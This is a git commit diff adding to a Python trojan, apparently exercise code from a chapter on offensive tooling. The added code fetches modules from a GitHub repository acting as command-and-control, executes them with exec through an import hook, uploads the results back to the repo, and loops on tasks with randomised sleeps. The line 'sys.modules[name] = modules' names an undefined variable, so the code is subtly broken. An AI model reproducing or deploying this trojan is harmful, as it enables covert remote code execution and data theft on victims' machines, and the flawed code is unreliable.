2f3b066fa65bd233d5a8af827b3a4c5f0d407b17
ILUXONCHIK <iluxon4ik@hotmail.com>
2016-02-26 20:59:04 +0000

    Chapter 7 additions

--- Chapter_07/trojan/git_trojan.py
+++ Chapter_07/trojan/git_trojan.py
@@ -42,5 +42,47 @@ def get_trojan_config():
 
 def store_module_result(data):
 	gh, repo, branch = connect_to_github()
-	remote_path = "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 1000000))
+	remote_path = relative_path + "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 1000000))
 	repo.create_file(remote_path, "[Trojan {0}] Adding data".format(trojan_id), base64.b64encode(data))
+
+class GitImporter(object):
+	def __init__(self):
+		self.current_module_code = ""
+
+	def find_module(self, fullname, path=None):
+		if configured:
+			print("[*] Attemping to retrieve {0}".format(fullname))
+			new_library = get_file_contents(relative_path + "modules/{0}".format(fullname))
+
+			if new_library is not None:
+				self.current_module_code = base64.b64decode(new_library)
+				return self
+		return None
+
+	def load_module(self, name):
+		module = imp.new_module(name)
+		exec(self.current_module_code, module.__dict__)
+		sys.modules[name] = modules
+
+		return module
+
+def module_runner(module):
+	task_queue.put(1)
+	result = sys.modules[module].run()
+	task_queue.get()
+
+	# store the result in the repo
+	store_module_result(result)
+
+sys.meta_path = [GitImporter()]
+
+# main trojan loop
+while True:
+	if task_queue.empty():
+		config = get_trojan_config()
+
+		for task in config:
+			t = threading.Thread(target=module_runner, args=(task['module'],))
+			t.start()
+			time.sleep(random.randint(1, 10))
+	time.sleep(random.randint(1000, 10000))
